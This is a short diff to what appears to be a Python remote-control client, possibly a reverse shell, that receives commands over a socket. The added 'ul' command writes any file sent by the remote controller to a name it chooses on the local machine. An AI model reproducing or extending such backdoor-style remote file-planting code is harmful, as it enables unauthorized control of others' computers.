@@ -66,6 +66,16 @@ Processor Architecture: {platform.processor()}
                 sock.send(b"DONE")
             print("Finished sending data")
 
+        elif cmd.split(" ")[0] == 'ul':
+            file_name = cmd.split(" ")[1]
+            with open(file_name, "wb") as f:
+                read_data = sock.recv(1024)
+                while read_data:
+                    f.write(read_data)
+                    read_data = sock.recv(1024)
+                    if read_data == b'DONE':
+                        break
+
         # Terminate the connection
         elif cmd == "exit":
             sock.send(b"exit")
